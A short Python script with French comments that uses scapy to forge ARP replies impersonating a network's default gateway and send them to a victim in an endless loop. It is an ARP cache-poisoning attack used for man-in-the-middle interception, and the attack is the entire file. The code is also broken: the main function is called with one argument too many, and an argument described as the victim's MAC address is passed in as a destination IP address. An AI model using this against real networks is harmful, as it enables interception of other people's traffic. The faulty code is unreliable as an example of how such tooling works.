import scapy.all as sc
import argparse


def SendPqt(pack):
    sc.send(pack, loop = 1)

def createPqt(ipPasserelle, ipVictime):
    #op = 1 est une request / op = 2 est une reply
    pkt=(sc.ARP ( psrc = ipPasserelle, pdst = ipVictime,op=2))
    pkt.show()
    res = input("Valider le paquets: [yes/no]: ")
    if res.lower() == "yes" or res.lower() == "y":
        SendPqt(pkt)
    else:
        return

sc.conf.checkIPaddr = False

# Créer un objet ArgumentParser
parser = argparse.ArgumentParser(description='Script d\' ARP Poising.')

# Ajouter les arguments attendus
parser.add_argument('Pass', type=str, default="0.0.0.0", help='Adresse IP de la passerelle par default.')
parser.add_argument('MacV', type=str, default="ff:ff:ff:ff:ff:ff", help='Adresse mac de la victime.')

# Analyser les arguments de la ligne de commande
args = parser.parse_args()

createPqt(args.Pass, args.MacV, "en0")